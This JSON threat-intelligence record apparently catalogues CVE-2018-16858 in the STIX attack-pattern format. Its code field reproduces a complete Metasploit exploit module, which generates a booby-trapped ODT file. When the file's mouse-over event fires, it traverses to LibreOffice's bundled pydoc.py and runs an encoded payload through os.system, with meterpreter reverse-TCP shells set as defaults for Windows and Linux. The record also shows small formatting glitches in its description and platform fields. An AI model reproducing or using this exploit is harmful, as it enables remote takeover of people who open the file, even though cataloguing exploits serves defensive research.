{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d37fe3c0-10c6-4eff-934f-478dbae11d3a",
    "created": "2024-08-14T17:05:06.638624Z",
    "modified": "2024-08-14T17:05:06.638628Z",
    "name": "LibreOffice Macro Code Execution",
    "description": " LibreOffice comes bundled with sample macros written in Python and allows the ability to bind program events to them. A macro can be tied to a program event by including the script that contains the macro and the function name to be executed. Additionally, a directory traversal vulnerability exists in the component that references the Python script to be executed. This allows a program event to execute functions from Python scripts relative to the path of the samples macros folder. The pydoc.py script included with LibreOffice contains the tempfilepager function that passes arguments to os.system, allowing RCE.  This module generates an ODT file with a mouse over event that when triggered, will execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/libreoffice_macro_exec.rb",
            "external_id": "libreoffice_macro_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-16858"
        },
        {
            "source_name": "reference",
            "url": "https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LibreOffice Macro Code Execution',\n      'Description'    => %q{\n        LibreOffice comes bundled with sample macros written in Python and\n        allows the ability to bind program events to them. A macro can be tied\n        to a program event by including the script that contains the macro and\n        the function name to be executed. Additionally, a directory traversal\n        vulnerability exists in the component that references the Python script\n        to be executed. This allows a program event to execute functions from Python\n        scripts relative to the path of the samples macros folder. The pydoc.py script\n        included with LibreOffice contains the tempfilepager function that passes\n        arguments to os.system, allowing RCE.\n\n        This module generates an ODT file with a mouse over event that\n        when triggered, will execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'Alex Inf\u00fchr', # Vulnerability discovery and PoC\n        'Shelby Pace'  # Metasploit Module\n      ],\n      'References'     =>\n        [\n          [ 'CVE', '2018-16858' ],\n          [ 'URL', 'https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html' ]\n        ],\n      'Platform'       => [ 'win', 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'Targets'        =>\n        [\n          [\n            'Windows',\n            {\n              'Platform'        =>  'win',\n              'Arch'            =>  [ ARCH_X86, ARCH_X64 ],\n              'Payload'         =>  'windows/meterpreter/reverse_tcp',\n              'DefaultOptions'  =>  { 'PrependMigrate'  =>  true }\n            }\n          ],\n          [\n            'Linux',\n            {\n              'Platform'        =>  'linux',\n              'Arch'            =>  [ ARCH_X86, ARCH_X64 ],\n              'Payload'         =>  'linux/x86/meterpreter/reverse_tcp',\n              'DefaultOptions'  =>  { 'PrependFork' =>  true },\n              'CmdStagerFlavor' =>  'printf',\n            }\n          ]\n        ],\n      'DisclosureDate'  =>  \"2018-10-18\",\n      'DefaultTarget'   =>  0\n    ))\n\n    register_options(\n    [\n      OptString.new('FILENAME', [true, 'Output file name', 'librefile.odt'])\n    ])\n  end\n\n  def gen_windows_cmd\n    opts =\n    {\n      :remove_comspec       =>  true,\n      :method               =>  'reflection',\n      :encode_final_payload =>  true\n    }\n    @cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, opts)\n    @cmd << ' &amp;&amp; echo'\n  end\n\n  def gen_linux_cmd\n    @cmd = generate_cmdstager.first\n    @cmd << ' &amp;&amp; echo'\n  end\n\n  def gen_file(path)\n    text_content = Rex::Text.rand_text_alpha(10..15)\n\n    # file from Alex Inf\u00fchr's PoC post referenced above\n    fodt_file = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-16858', 'librefile.erb'))\n    libre_file = ERB.new(fodt_file).result(binding())\n    libre_file\n  rescue Errno::ENOENT\n    fail_with(Failure::NotFound, 'Cannot find template file')\n  end\n\n  def exploit\n    path = '../../../program/python-core-3.5.5/lib/pydoc.py'\n    if datastore['TARGET'] == 0\n      gen_windows_cmd\n    elsif datastore['TARGET'] == 1\n      gen_linux_cmd\n    else\n      fail_with(Failure::BadConfig, 'A formal target was not chosen.')\n    end\n    fodt_file = gen_file(path)\n\n    file_create(fodt_file)\n  end\nend\n",
    "x_mitre_disclosure_date": "\"2018-10-18\"",
    "x_mitre_platforms": [
        "linux'"
    ]
}